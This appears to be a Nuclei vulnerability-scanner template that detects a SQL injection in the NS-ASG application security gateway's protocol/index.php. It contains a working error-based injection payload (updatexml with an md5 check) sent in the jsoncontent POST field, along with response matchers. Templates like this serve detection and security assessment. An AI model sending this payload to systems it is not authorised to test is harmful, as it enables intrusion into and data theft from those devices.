id: poc-yaml-ns-asg-index-sqli
info:
  name: 网康科技 NS-ASG 应用安全网关 protocol/index.php SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: sql-injection

variables:
  v1: "{{rand_base(5)}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/protocol/index.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      jsoncontent={"protocolType":"uploadiscgwtunnel","messagecontent":["1^(updatexml(1,(select+md5('{{v1}}')),1))"]}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "{{to_lower(md5(v1))}}"
      - type: word
        part: body
        words:
          - "GWLinkId,SGWName,DGWName,SharedKey,IP,Port"
